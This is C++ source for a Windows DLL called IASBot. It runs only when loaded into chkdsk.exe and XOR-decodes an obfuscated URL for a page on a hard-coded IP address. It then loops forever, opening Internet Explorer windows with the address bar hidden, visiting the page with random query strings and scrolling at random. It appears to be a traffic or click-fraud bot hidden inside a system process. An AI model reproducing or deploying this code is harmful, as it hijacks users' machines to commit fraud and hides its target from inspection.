// IASBot.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "IASBot.h"
#include <time.h>

void ErrorExit(wchar_t *err)
{
	MessageBox(NULL, err, L"Error", 0);
}
extern "C" __declspec(dllexport) void main()
{
	char *exeName = (char*)malloc(sizeof(char)*MAX_PATH);

	GetModuleFileNameA(NULL,exeName, MAX_PATH);
	if (!strstr(exeName,"chkdsk.exe"))
	{
		return;
	}
	srand(time(NULL));
	IWebBrowser2 *pWb;

	char cryptUrl[] = { 0xfa, 0xe6, 0xe6, 0xe2, 0xa8, 0xbd, 0xbd, 0xa3, 0xa2, 0xa6, 0xbc, 0xa3, 0xab, 0xa5, 0xbc, 0xa3, 0xa1, 0xa7, 0xbc, 0xa0, 0xa2, 0xa7, 0xbd, 0xdb, 0xd3, 0xc1, 0xdc, 0xf3, 0xe4, 0xfb, 0xf5, 0xf3, 0xe6, 0xf7, 0xbc, 0xe2, 0xfa, 0xe2, 0x00 };

	wchar_t* url = (wchar_t*)malloc(strlen(cryptUrl)*sizeof(wchar_t));
	for (unsigned int i = 0; i < strlen(cryptUrl); i++)
		cryptUrl[i] = cryptUrl[i] ^ 0x92;
	//	memcpy(++url, cryptUrl ^ 0x92, sizeof(char));
	MultiByteToWideChar(CP_UTF8, 0, cryptUrl, -1, url, strlen(cryptUrl)+1);
	IHTMLDocument2 *doc;
	IHTMLWindow2 *wind;
	IDispatch *d;


	while (1)
	{
		pWb = CreateBrowser();
		Navigate(pWb, url);
		Sleep(7000);
			pWb->get_Document(&d);
			HRESULT s = d->QueryInterface(IID_IHTMLDocument2, (void**)&doc);
			if (SUCCEEDED(s))
			{
				if (SUCCEEDED(doc->get_parentWindow(&wind)))
				{
					wind->QueryInterface(IID_IHTMLWindow2, (void**)&wind);
					wind->scrollBy(0, rand() % 1550);
					wind->Release();
				}
				doc->Release();
			}
		Sleep(13000);
		pWb->ExecWB(OLECMDID_CLOSE, OLECMDEXECOPT_DONTPROMPTUSER, 0, 0);
	
		//pWb->Release();
	}
}

void Navigate(IWebBrowser2 *pWb, wchar_t* url)
{
	int val = (rand() % 10000) * 13;
	wchar_t *uri = (wchar_t*)malloc(sizeof(wchar_t) * 32);
	swprintf(uri, 128, L"%d", val);
	wchar_t *dest = (wchar_t*)(malloc(sizeof(wchar_t)*(wcslen(uri) + wcslen(url))));
	swprintf(dest,128, L"%s?%s", url, uri);
	BSTR u = SysAllocString(dest);
	pWb->Navigate(u,NULL,NULL,NULL,NULL);
	VARIANT_BOOL bBusy;
	do{
		Sleep(500);
		pWb->get_Busy(&bBusy);
	} while (bBusy);
	free(uri);
	free(dest);
	SysFreeString(u);
}

IWebBrowser2 *CreateBrowser()
{
	HRESULT hr;

	//CoInitializeEx(NULL,COINIT_MULTITHREADED);
	
	CoInitialize(NULL);
	IWebBrowser2 *pIAD,*pWb;
	
	hr = CoCreateInstance(CLSID_InternetExplorer,
		NULL,
		CLSCTX_ALL,
		IID_IWebBrowser2,
		(void**)&pIAD);

	if (SUCCEEDED(hr))
	{
		pIAD->put_AddressBar(false);
		pIAD->put_Visible(1);
		pIAD->QueryInterface(IID_IWebBrowser2, (LPVOID *)&pWb);
		pIAD->Release();
		return pWb;
	}
	else
	{
		ErrorExit(L"Error 0x1: Could not start browser");
	}
	return NULL;
}